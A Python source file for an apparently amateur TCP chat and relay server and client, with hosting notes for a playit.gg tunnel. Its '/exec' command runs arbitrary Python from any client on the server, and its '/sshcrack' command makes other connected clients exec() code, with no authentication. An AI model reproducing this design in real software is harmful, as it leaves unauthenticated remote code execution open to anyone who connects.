import socket
import threading
import queue

"""
hosting:
TCP protocl playit.gg
port 5667

to host: is just port 5667
to connect: is just ip: leading-hon.gl.at.ply.gg and port (random number after leading-hon.gl.at.ply.gg:"57676")

commands:
/ping
lists all clients

/ping <client id>
pings target client and relays back if exists

/ping server
server echoes back if exists

/exec
runs a python code on the server

/relay <client id> <message>
sends message to target client. if message is empty, sends Echo.

/sshcrack <client id> <command>
executes that command on the target client's machine
"""

# ===================== SERVER ===================== #
class Server:
    def __init__(self, host='0.0.0.0', port=5667):
        self.host = host
        self.port = port
        self.clients = {}  # client_id: (conn, addr)
        self.clients_lock = threading.Lock()
        self.running = False
        self.msg_queue = queue.Queue()
        self.client_id_seq = 0
        self.free_ids = set()    # <--- track reusable IDs

    def _client_thread(self, client_id):
        with self.clients_lock:
            if client_id not in self.clients:
                return  # Bail if client vanished
            conn, addr = self.clients[client_id]
            conn.settimeout(1.0)
        buffer = ""
        try:
            while self.running:
                try:
                    data = conn.recv(1024)
                except socket.timeout:
                    continue
                if not data:
                    break
                buffer += data.decode()
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    self.msg_queue.put((client_id, line.strip()))
        except Exception as e:
            print(f"Client {client_id} error:", e)
        finally:
            try:
                conn.shutdown(socket.SHUT_RDWR)
            except:
                pass
            conn.close()
            with self.clients_lock:
                if client_id in self.clients:
                    del self.clients[client_id]
                self.free_ids.add(client_id)

            self.msg_queue.put((client_id, None))

    def start(self):
        self.running = True
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.host, self.port))
        self.sock.listen()
        print(f"Server listening on {self.host}:{self.port}")
        threading.Thread(target=self._accept_thread, daemon=True).start()

    def _accept_thread(self):
        while self.running:
            try:
                conn, addr = self.sock.accept()
                with self.clients_lock:
                    if self.free_ids:
                        client_id = min(self.free_ids)  # reuse lowest freed ID
                        self.free_ids.remove(client_id)
                    else:
                        self.client_id_seq += 1
                        client_id = self.client_id_seq
                    self.clients[client_id] = (conn, addr)
                print(f"Client {client_id} connected from {addr}")
                threading.Thread(target=self._client_thread, args=(client_id,), daemon=True).start()
            except Exception as e:
                print("Accept error:", e)

    def send(self, client_id, message, exclude_sender=None):
        conns = []
        with self.clients_lock:
            if client_id is None:
                # Broadcast to all clients, optionally excluding sender
                for cid, (conn, _) in self.clients.items():
                    if exclude_sender is None or cid != exclude_sender:
                        conns.append(conn)
            else:
                if client_id in self.clients:
                    conns = [self.clients[client_id][0]]
        for conn in conns:
            try:
                conn.send((message + '\n').encode())
            except Exception as e:
                print(f"Send error:", e)

    def receive(self):
        """Return tuple (client_id, message) or None if no messages"""
        try:
            msg = self.msg_queue.get_nowait()
            if msg != "" and msg != None:
                if self.iscommand(msg) == 0:
                    return msg
        except queue.Empty:
            return None
        
    def iscommand(self, inp):
        try:
            commands = ["/exec", "/ping", "/req_echo", "/relay", "/sshcrack", "/chat"]
            # inp is (client_id, message)
            if inp != None or inp != "":
                try:
                    full_msg = inp[1].strip()
                except:
                    full_msg = inp[1]
            try:
                parts = full_msg.split(maxsplit=1)  # split into command + rest
            except:
                parts = full_msg

            cmd = parts[0]
            rest = parts[1] if len(parts) > 1 else ""

            if cmd in commands:
                #self.send(inp[0], f"running {full_msg}")
                if cmd == "/exec":
                    try:
                        exec(rest)
                        log = "successfully executed"
                    except Exception as e:
                        log = str(e)
                    self.send(inp[0], log)
                    print(f"client {inp[0]}: {log}")
                    return 1
                elif cmd == "/ping":
                    if len(parts) == 1:
                        with self.clients_lock:
                            clients = ", ".join(map(str, self.clients.keys()))
                        self.send(inp[0], f"connected clients: {clients}")
                        self.send(inp[0], f"your id is {inp[0]}")
                        print(f"client {inp[0]}: connected clients: {clients}")
                    elif len(parts) == 2:
                        #self.send(inp[0], f"pinging {rest}")
                        if rest == "server":
                            self.send(inp[0], "Echo")
                        else:
                            self.send(int(rest), f"/req_echo {inp[0]}")
                    return 1
                elif cmd == "/req_echo":
                    if len(parts) == 1:
                        self.send(inp[0], "Echo")
                    return 1
                elif cmd == "/sshcrack":
                    if len(parts) > 1:
                        if len(rest.split()) > 1:
                            target = int(rest.split()[0])
                            val = rest.split(maxsplit=1)[1]
                        
                        self.send(target, f"/ssh {val}&{inp[0]}")
                    return 1
                elif cmd == "/relay":
                    args = parts[1].split(maxsplit=1)
                    print("relaying")
                    if len(args) == 1:
                        print("yipers")
                    elif len(args) == 2:
                        self.send(int(args[0]), args[1])
                    return 1
                elif cmd == "/chat":
                    self.send(None, rest, inp[0])
                    return 1
            return 0
        except Exception as e:
            self.send(inp[0], f"error: {e}")
            print(f"error: {e}")
            return 1

    def stop(self):
        self.running = False
        self.sock.close()
        with self.clients_lock:
            for conn, _ in self.clients.values():
                try:
                    conn.close()
                except:
                    pass
            self.clients.clear()
            
# ===================== CLIENT ===================== #
class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.msg_queue = queue.Queue()
        self.running = False
        self.sock = None

    def _recv_thread(self):
        buffer = ""
        self.sock.settimeout(1.0)  # timeout to avoid blocking forever
        try:
            while self.running:
                try:
                    data = self.sock.recv(1024)
                except socket.timeout:
                    continue
                if not data:
                    break
                buffer += data.decode()
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    self.msg_queue.put(line.strip())
        except Exception as e:
            print("Client recv error:", e)
        finally:
            self.running = False
            self.sock.close()
            self.msg_queue.put(None)

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        self.running = True
        threading.Thread(target=self._recv_thread, daemon=True).start()

    def send(self, message):
        try:
            self.sock.send((message + '\n').encode())
        except Exception as e:
            print("Client send error:", e)
            self.running = False

    def receive(self):
        """Return tuple (client_id, message) or None if no messages"""
        try:
            msg = self.msg_queue.get_nowait()
            if self.iscommand(msg) == 0:
                return msg
        except queue.Empty:
            return None

    def iscommand(self, inp):
        try:
            commands = ["/exec", "/ping", "/req_echo", "/ssh"]
            
            if inp is None or inp == "":
                return 1
                
            full_msg = inp.strip()  # inp is a string, not a tuple
            parts = full_msg.split(maxsplit=1)  # split into command + rest

            cmd = parts[0]
            rest = parts[1] if len(parts) > 1 else ""

            if cmd in commands:
                if cmd == "/req_echo":
                    self.send(f"/relay {rest}")
                    return 1
                    
                elif cmd == "/ssh":
                    # Parse: /ssh <command>&<origin>
                    if "&" in rest:
                        command_part, origin = rest.split("&", 1)
                        
                        # Execute the command locally
                        self.execute_ssh_command(command_part.strip(), origin)
                        
                        # Send acknowledgment back to origin
                        self.send(f"/relay {origin} SSH command executed")
                    else:
                        print("Invalid SSH command format")
                    return 1
                    
            return 0
        except Exception as e:
            print(f"Client command error: {e}")
            return 1

    def execute_ssh_command(self, command, origin):
        """Execute SSH command received from server"""
        try:
            parts = command.split(maxsplit=1)
            cmd = parts[0]
            args = parts[1] if len(parts) > 1 else ""
            
            if cmd == "/exec":
                try:
                    exec(args)
                    result = f"SSH exec successful: {args}"
                    print(f"Executed via SSH from client {origin}: {args}")
                except Exception as e:
                    result = f"SSH exec error: {str(e)}"
                    print(f"SSH exec error: {e}")
                    
            elif cmd == "/ping":
                if args == "":
                    result = f"SSH ping response: I'm alive!"
                elif args == "server":
                    result = f"SSH ping to server: Echo"
                else:
                    result = f"SSH ping to {args}: Echo"
                print(f"SSH ping from client {origin}")
                
            elif cmd == "/relay":
                relay_parts = args.split(maxsplit=1)
                if len(relay_parts) == 2:
                    target, message = relay_parts
                    self.send(f"/relay {target} [SSH-RELAYED] {message}")
                    result = f"SSH relay sent to {target}"
                else:
                    result = "SSH relay: Invalid format"
                    
            else:
                result = f"SSH: Unknown command {cmd}"
                
            # Send result back to origin
            self.send(f"/relay {origin} SSH Result: {result}")
            
        except Exception as e:
            self.send(f"/relay {origin} SSH Error: {str(e)}")
            print(f"SSH command execution error: {e}")

    def disconnect(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
